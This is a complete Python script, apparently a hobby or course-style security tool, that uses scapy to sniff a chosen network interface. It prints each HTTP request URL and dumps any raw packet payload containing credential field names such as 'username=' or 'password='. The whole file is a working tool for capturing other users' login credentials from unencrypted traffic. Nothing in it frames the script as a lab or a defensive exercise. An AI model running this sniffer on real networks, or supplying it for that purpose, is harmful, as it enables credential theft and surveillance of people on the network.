# A Packet Sniffer tool that Sniffs for Packets flowing through the specified interface and Filters for URLs and Login Forms.
# Use -i to Speciify the interface to Sniff on.
# Author: gobinathan-l

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
#from chardet import detect
import argparse

def get_arguements():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to Listen on")
    options = parser.parse_args()
    return options

def sniff_packets(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_creds(packet):
    if packet.haslayer(scapy.Raw):
        packet_load = str(packet[scapy.Raw].load)
        cred_fields = ["username=", "user=", "uname=", "login=", "email=", "passwd=", "pass=", "password="]
        for keyword in cred_fields:
            if keyword in packet_load:
                return packet_load

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(colored("[+] HTTP Request >>  ", "green") + url.decode())
    creds_load = get_creds(packet)
    if creds_load:
        print("==============================================")
        print(colored("\n[+] Possible Password Field >> ", "yellow") + creds_load + "\n")
        print("==============================================")

options = get_arguements()
print(colored(f"[+] Sniffer running on {options.interface}. Waiting for Traffic..", "green"))
sniff_packets(options.interface)